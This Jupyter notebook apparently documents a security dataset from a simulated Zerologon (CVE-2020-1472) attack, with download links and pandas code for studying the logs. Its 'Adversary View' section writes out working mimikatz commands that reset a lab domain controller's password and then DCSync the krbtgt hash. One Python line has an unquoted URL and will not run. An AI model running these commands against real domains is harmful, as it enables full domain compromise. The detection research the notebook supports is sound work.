{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cdf8b1c0",
   "metadata": {},
   "source": [
    "# Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "224e06c6",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d422d933",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/16 |\n",
    "| Modification Date | 2020/09/16 |\n",
    "| Tactics           | [TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1210](https://attack.mitre.org/techniques/T1210) |\n",
    "| Tags              | CVE-2020-1472,Password Update,Netlogon Insecure AES-CFB8 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "81db98a0",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries leveraging a vulnerability (CVE-2020-1472) in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This vulnerability was discovered by [@@SecuraBV](https://twitter.com/SecuraBV)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b18cb18a",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6ced522",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "512426ae",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "89b1d9d7",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a0d6466",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Covenant | [ShellCmd](https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96) |\n",
    "| tool | mimikatz | [lsadump](https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L23) |\n",
    "| tool | SharpZeroLogon | [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "50037dd1",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Mimikatz Implementation (NetrServerAuthenticate2)\n",
    "=================================================\n",
    "\n",
    "(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \\\"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\\\" exit\"\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 16 2020 12:02:22\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "\n",
    "mimikatz(commandline) # lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\n",
    "\n",
    "Target : MORDORDC.theshire.local\n",
    "Account: MORDORDC$\n",
    "Type   : 6 (Server)\n",
    "Mode   : exploit\n",
    "\n",
    "Trying to 'authenticate'...\n",
    "====================================================\n",
    "\n",
    "NetrServerAuthenticate2: 0x00000000\n",
    "NetrServerPasswordSet2 : 0x00000000\n",
    "\n",
    "* Authentication: OK -- vulnerable\n",
    "* Set password  : OK -- may be unstable\n",
    "\n",
    "mimikatz(commandline) # exit\n",
    "\n",
    "Bye!\n",
    "\n",
    "DCSync Follow-up (Optional)\n",
    "(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \\\"lsadump::dcsync /domain:theshire.local /dc:MORDORDC.theshire.local /user:krbtgt /authuser:MORDORDC$ /authdomain:theshire /authpassword:\\\\\"\\\\\" /authntlm\\\" exit\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c688dbe4",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3b0cd557",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78b5c45b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b84b7f8f",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6760e156",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7860b1b0",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "069f749a",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "720affdd",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.secura.com/blog/zero-logon](https://www.secura.com/blog/zero-logon) \n",
    "* [https://www.secura.com/pathtoimg.php?id=2055](https://www.secura.com/pathtoimg.php?id=2055) \n",
    "* [https://twitter.com/gentilkiwi/status/1306178689630076929](https://twitter.com/gentilkiwi/status/1306178689630076929) \n",
    "* [https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon) \n",
    "* [https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc#theGroupPolicy](https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc#theGroupPolicy) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
